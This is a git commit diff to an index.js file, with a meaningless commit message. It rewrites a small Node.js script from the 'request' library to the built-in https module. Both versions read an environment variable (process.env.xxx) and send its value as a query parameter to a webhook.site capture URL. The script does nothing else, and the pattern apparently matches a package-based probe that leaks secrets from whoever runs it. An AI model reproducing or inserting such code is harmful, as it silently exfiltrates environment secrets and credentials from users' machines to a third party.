efb093efe8c7a9213c0070efe715a49afd14e7b5
Black-Hole1 <158blackhole@gmail.com>
2021-04-13 14:01:32 +0800

    xxxx

--- index.js
+++ index.js
@@ -1,13 +1,21 @@
-var request = require('request');
-
-var options = {
-    url: `https://webhook.site/8115d6a1-b414-40f3-9ae1-4eb19bd0e341?xxx=${process.env.xxx}`
-};
-
-function callback(error, response, body) {
-    if (!error && response.statusCode == 200) {
-        console.log(body);
-    }
+const https = require('https')
+const options = {
+  hostname: 'webhook.site',
+  port: 443,
+  path: `/8115d6a1-b414-40f3-9ae1-4eb19bd0e341?xxx=${process.env.xxx}`,
+  method: 'GET'
 }
 
-request(options, callback);
+const req = https.request(options, res => {
+  console.log(`statusCode: ${res.statusCode}`)
+
+  res.on('data', d => {
+    process.stdout.write(d)
+  })
+})
+
+req.on('error', error => {
+  console.error(error)
+})
+
+req.end()
